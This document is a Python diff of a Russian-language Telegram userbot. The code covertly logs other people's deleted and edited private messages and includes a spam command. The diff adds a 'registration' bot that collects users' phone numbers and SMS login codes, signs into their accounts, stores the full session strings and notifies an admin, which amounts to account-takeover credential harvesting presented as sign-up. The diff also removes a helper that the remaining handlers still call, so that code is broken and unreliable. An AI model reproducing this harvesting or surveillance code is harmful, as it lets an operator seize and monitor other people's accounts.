@@ -2,100 +2,74 @@ import asyncio
 import sqlite3
 import os
 from datetime import datetime
+from threading import Thread
+from flask import Flask
 from telethon import TelegramClient, events
 from telethon.tl import types
 from telethon.tl.types import PeerUser
-import telebot
-from threading import Thread
+from telethon.sessions import StringSession
+from aiogram import Bot, Dispatcher, types as aiogram_types
+from aiogram.utils import executor
 import nest_asyncio
 
 nest_asyncio.apply()
 
-# Загрузка переменных окружения
-api_id = int(os.environ.get('API_ID', 1234567))
-api_hash = os.environ.get('API_HASH', '1')
-token = os.environ.get('BOT_TOKEN', '1')
+# ========== КОНФИГ ==========
+API_ID = int(os.environ.get('API_ID'))
+API_HASH = os.environ.get('API_HASH')
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
 
-client = TelegramClient('ub', api_id, api_hash)
-bot = telebot.TeleBot(token)
-
+# ========== БД ==========
 conn = sqlite3.connect('userbot.db', check_same_thread=False)
 cursor = conn.cursor()
+
+# Таблица для сообщений (отслеживание удалений/изменений)
 cursor.execute('''CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, msg_id INTEGER, user_id INTEGER, chat_id INTEGER, text TEXT, date TEXT)''')
+# Таблица для замьюченных пользователей
 cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER PRIMARY KEY)''')
+# Таблица для сессий зарегистрированных пользователей
+cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
 conn.commit()
 
 stored_messages = {}
 owner_id = None
 muted_users = set()
 
+# ========== ТВОЙ ЮЗЕРБОТ ==========
+user_client = TelegramClient('ub', API_ID, API_HASH)
 
+# ========== БОТ ДЛЯ РЕГИСТРАЦИИ ==========
+reg_bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher(reg_bot)
+temp_reg_data = {}
 
+# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 async def get_user_info(user_id):
     try:
-        user = await client.get_entity(user_id)
+        user = await user_client.get_entity(user_id)
         username = user.username if user.username else ""
         name = f"{user.first_name or ''} {user.last_name or ''}".strip()
         return username, name, user
     except:
         return "", "Неизвестный пользователь", None
 
-
-def send_bot_message_sync(text):
-    try:
-        bot.send_message(owner_id, text, parse_mode='HTML', disable_web_page_preview=True)
-    except Exception as e:
-        print(f"Bot send error: {e}")
-
-
-async def send_bot_message(text):
-    loop = asyncio.get_event_loop()
-    await loop.run_in_executor(None, send_bot_message_sync, text)
-
-
 async def check_is_owner(event):
     return event.message.sender_id == owner_id
 
+async def load_muted_users():
+    cursor.execute('SELECT user_id FROM muted_users')
+    rows = cursor.fetchall()
+    global muted_users
+    muted_users = {row[0] for row in rows}
 
-async def process_deleted_message(chat_id, user_id, msg_id):
-    if user_id == owner_id:
-        return
-    cursor.execute('SELECT text FROM messages WHERE msg_id=? AND user_id=? AND chat_id=?', (msg_id, user_id, chat_id))
-    row = cursor.fetchone()
-    if row:
-        original_text = row[0]
-        username, name, user = await get_user_info(user_id)
-        if username:
-            link = f"https://t.me/{username}"
-        else:
-            link = f"tg://user?id={user_id}"
-        message_text = f"🗑 Это сообщение было удалено\n\n<blockquote><a href=\"{link}\">{name}</a>\n{original_text}</blockquote>"
-        await send_bot_message(message_text)
-    cursor.execute('DELETE FROM messages WHERE msg_id=? AND user_id=? AND chat_id=?', (msg_id, user_id, chat_id))
-    conn.commit()
+async def get_owner_id():
+    me = await user_client.get_me()
+    return me.id
 
+# ========== ОБРАБОТЧИКИ ДЛЯ ТВОЕГО ЮЗЕРБОТА ==========
 
-async def process_edited_message(event):
-    if event.message.out:
-        return
-    cursor.execute('SELECT text FROM messages WHERE msg_id=? AND user_id=? AND chat_id=?', (event.message.id, event.message.peer_id.user_id, event.message.chat_id))
-    row = cursor.fetchone()
-    if row:
-        old_text = row[0]
-        new_text = event.message.text or event.message.message or ""
-        if new_text != old_text:
-            username, name, user = await get_user_info(event.message.peer_id.user_id)
-            if username:
-                link = f"https://t.me/{username}"
-            else:
-                link = f"tg://user?id={event.message.peer_id.user_id}"
-            message_text = f"🔏 <a href=\"{link}\">{name}</a> изменил сообщение.\n\nСтарый текст:\n<blockquote>{old_text}</blockquote>\nНовый текст:\n<blockquote>{new_text}</blockquote>"
-            await send_bot_message(message_text)
-            cursor.execute('UPDATE messages SET text=? WHERE msg_id=? AND user_id=? AND chat_id=?', (new_text, event.message.id, event.message.peer_id.user_id, event.message.chat_id))
-            conn.commit()
-
-
-@client.on(events.Raw(types.UpdateDeleteMessages))
+@user_client.on(events.Raw(types.UpdateDeleteMessages))
 async def raw_deleted_handler(event):
     try:
         for msg_id in event.messages:
@@ -111,7 +85,7 @@ async def raw_deleted_handler(event):
                                 link = f"https://t.me/{username}"
                             else:
                                 link = f"tg://user?id={user_id}"
-                            message_text = f"🗑(@skladmaterialov) Это сообщение было удалено\n\n<blockquote><a href=\"{link}\">{name}</a>\n{text}</blockquote>"
+                            message_text = f"🗑 Это сообщение было удалено\n\n<blockquote><a href=\"{link}\">{name}</a>\n{text}</blockquote>"
                             await send_bot_message(message_text)
                         cursor.execute('DELETE FROM messages WHERE msg_id=? AND chat_id=?', (msg_id, chat_id))
                         conn.commit()
@@ -120,8 +94,7 @@ async def raw_deleted_handler(event):
     except Exception as e:
         print(f"Raw delete error: {e}")
 
-
-@client.on(events.Raw(types.UpdateEditMessage))
+@user_client.on(events.Raw(types.UpdateEditMessage))
 async def raw_edit_handler(event):
     try:
         if hasattr(event, 'message'):
@@ -141,7 +114,7 @@ async def raw_edit_handler(event):
                                 link = f"https://t.me/{username}"
                             else:
                                 link = f"tg://user?id={user_id}"
-                            message_text = f"🔏 <a href=\"{link}\">{name}</a> изменил сообщение (@skladmaterialov).\n\nСтарый текст:\n<blockquote>{old_text}</blockquote>\nНовый текст:\n<blockquote>{new_text}</blockquote>"
+                            message_text = f"🔏 <a href=\"{link}\">{name}</a> изменил сообщение.\n\nСтарый текст:\n<blockquote>{old_text}</blockquote>\nНовый текст:\n<blockquote>{new_text}</blockquote>"
                             await send_bot_message(message_text)
                             cursor.execute('UPDATE messages SET text=? WHERE msg_id=? AND chat_id=?', (new_text, msg.id, peer.user_id))
                             conn.commit()
@@ -149,8 +122,7 @@ async def raw_edit_handler(event):
     except Exception as e:
         print(f"Raw edit error: {e}")
 
-
-@client.on(events.NewMessage(outgoing=True, pattern=r'^\.mute$'))
+@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.mute$'))
 async def mute_handler(event):
     if not await check_is_owner(event):
         return
@@ -174,8 +146,7 @@ async def mute_handler(event):
         print(f"Mute error: {e}")
         await event.edit('💬 Использование: .mute (в ответ на сообщение)')
 
-
-@client.on(events.NewMessage(outgoing=True, pattern=r'^\.unmute$'))
+@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.unmute$'))
 async def unmute_handler(event):
     if not await check_is_owner(event):
         return
@@ -199,8 +170,7 @@ async def unmute_handler(event):
         print(f"Unmute error: {e}")
         await event.edit('💬 Использование: .unmute (в ответ на сообщение)')
 
-
-@client.on(events.NewMessage(incoming=True))
+@user_client.on(events.NewMessage(incoming=True))
 async def incoming_message_handler(event):
     if isinstance(event.message.peer_id, PeerUser) and not event.message.out:
         try:
@@ -222,8 +192,7 @@ async def incoming_message_handler(event):
         except Exception as e:
             print(f"Store error: {e}")
 
-
-@client.on(events.NewMessage(outgoing=True, pattern=r'^\.type '))
+@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.type '))
 async def type_handler(event):
     if not await check_is_owner(event):
         return
@@ -245,8 +214,7 @@ async def type_handler(event):
         print(f"Type error: {e}")
         await event.edit('💬 Использование: .type [текст]')
 
-
-@client.on(events.NewMessage(outgoing=True, pattern=r'^\.spam '))
+@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.spam '))
 async def spam_handler(event):
     if not await check_is_owner(event):
         return
@@ -274,15 +242,14 @@ async def spam_handler(event):
         
         for i in range(count):
             if reply_msg:
-                await client.send_message(event.chat_id, message=reply_msg)
+                await user_client.send_message(event.chat_id, message=reply_msg)
             elif len(parts) > 2:
-                await client.send_message(event.chat_id, parts[2])
+                await user_client.send_message(event.chat_id, parts[2])
             await asyncio.sleep(0.3)
     except Exception as e:
         print(f"Spam error: {e}")
 
-
-@client.on(events.NewMessage(outgoing=True, pattern=r'^\.info$'))
+@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.info$'))
 async def info_handler(event):
     if not await check_is_owner(event):
         return
@@ -306,8 +273,7 @@ async def info_handler(event):
         print(f"Info error: {e}")
         await event.edit('Ответьте на сообщение!')
 
-
-@client.on(events.NewMessage(outgoing=True, pattern=r'^\.help( .*)?$'))
+@user_client.on(events.NewMessage(outgoing=True, pattern=r'^\.help( .*)?$'))
 async def help_handler(event):
     if not await check_is_owner(event):
         return
@@ -346,8 +312,7 @@ async def help_handler(event):
 Справка по определенной команде: <code>.help [команда]</code>"""
         await event.edit(help_text, parse_mode='HTML')
 
-
-@client.on(events.NewMessage(outgoing=True))
+@user_client.on(events.NewMessage(outgoing=True))
 async def outgoing_message_handler(event):
     if isinstance(event.message.peer_id, PeerUser):
         try:
@@ -361,57 +326,84 @@ async def outgoing_message_handler(event):
         except Exception as e:
             print(f"Store outgoing error: {e}")
 
+# ========== БОТ ДЛЯ РЕГИСТРАЦИИ ПОЛЬЗОВАТЕЛЕЙ ==========
 
-@client.on(events.MessageEdited)
-async def handler_message_edited(event):
-    if isinstance(event.message.peer_id, PeerUser) and not event.message.out:
-        await process_edited_message(event)
+@dp.message_handler(commands=['start'])
+async def start_reg(message: aiogram_types.Message):
+    user_id = message.from_user.id
+    
+    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
+    if cursor.fetchone():
+        await message.answer("✅ Ты уже зарегистрирован!")
+        return
+    
+    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
+    await message.answer("🔐 Отправь свой номер телефона для регистрации", reply_markup=kb)
 
+@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
+async def get_phone(message: aiogram_types.Message):
+    user_id = message.from_user.id
+    phone = message.contact.phone_number
+    
+    try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        result = await client.send_code_request(phone)
+        temp_reg_data[user_id] = {"client": client, "phone": phone, "hash": result.phone_code_hash}
+        await message.answer("📱 Введи код из SMS (5 цифр):", reply_markup=aiogram_types.ReplyKeyboardRemove())
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
 
-@client.on(events.MessageDeleted)
-async def handler_message_deleted(event):
-    if hasattr(event, 'original_update'):
-        for msg in event.deleted_ids:
-            cursor.execute('SELECT user_id, chat_id FROM messages WHERE msg_id=?', (msg,))
-            row = cursor.fetchone()
-            if row:
-                user_id, chat_id = row
-                await process_deleted_message(chat_id, user_id, msg)
+@dp.message_handler(lambda msg: msg.text and msg.text.isdigit() and len(msg.text) == 5)
+async def get_code(message: aiogram_types.Message):
+    user_id = message.from_user.id
+    code = message.text
+    
+    if user_id not in temp_reg_data:
+        await message.answer("❌ Начни заново: /start")
+        return
+    
+    data = temp_reg_data[user_id]
+    
+    try:
+        await data["client"].sign_in(phone=data["phone"], code=code, phone_code_hash=data["hash"])
+        session_str = data["client"].session.save()
+        
+        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
+        conn.commit()
+        
+        await message.answer("✅ Регистрация успешна! Теперь ты можешь использовать юзербота.")
+        
+        if ADMIN_ID:
+            await reg_bot.send_message(ADMIN_ID, f"🎉 Новый пользователь зарегистрирован!\nID: {user_id}\nUsername: @{message.from_user.username}")
+        
+        await data["client"].disconnect()
+        del temp_reg_data[user_id]
+    except Exception as e:
+        await message.answer(f"❌ Ошибка авторизации: {e}")
 
+# ========== ВЕБ-СЕРВЕР ДЛЯ RAILWAY ==========
+flask_app = Flask(__name__)
 
-async def load_muted_users():
-    cursor.execute('SELECT user_id FROM muted_users')
-    rows = cursor.fetchall()
-    global muted_users
-    muted_users = {row[0] for row in rows}
+@flask_app.route('/')
+def health():
+    return "UserBot Running!"
 
+def run_web():
+    flask_app.run(host='0.0.0.0', port=8080)
 
-async def get_owner_id():
-    me = await client.get_me()
-    return me.id
-
-
-def run_bot():
-    while True:
-        try:
-            bot.polling(none_stop=True, timeout=30)
-        except Exception as e:
-            print(f"Bot polling error: {e}")
-            import time
-            time.sleep(5)
-
-
+# ========== ЗАПУСК ==========
 async def main():
-    await client.start()
     global owner_id
+    await user_client.start()
     owner_id = await get_owner_id()
     await load_muted_users()
-    print(f"UB started! User ID: {owner_id}")
-    print(f"Muted users loaded: {len(muted_users)}")
-    
-    bot_thread = Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    await client.run_until_disconnected()
+    print(f"✅ Юзербот запущен! User ID: {owner_id}")
+    print(f"✅ Замученных пользователей: {len(muted_users)}")
+    await user_client.run_until_disconnected()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
+    Thread(target=run_web, daemon=True).start()
+    Thread(target=lambda: executor.start_polling(dp, skip_updates=True), daemon=True).start()
     asyncio.run(main())
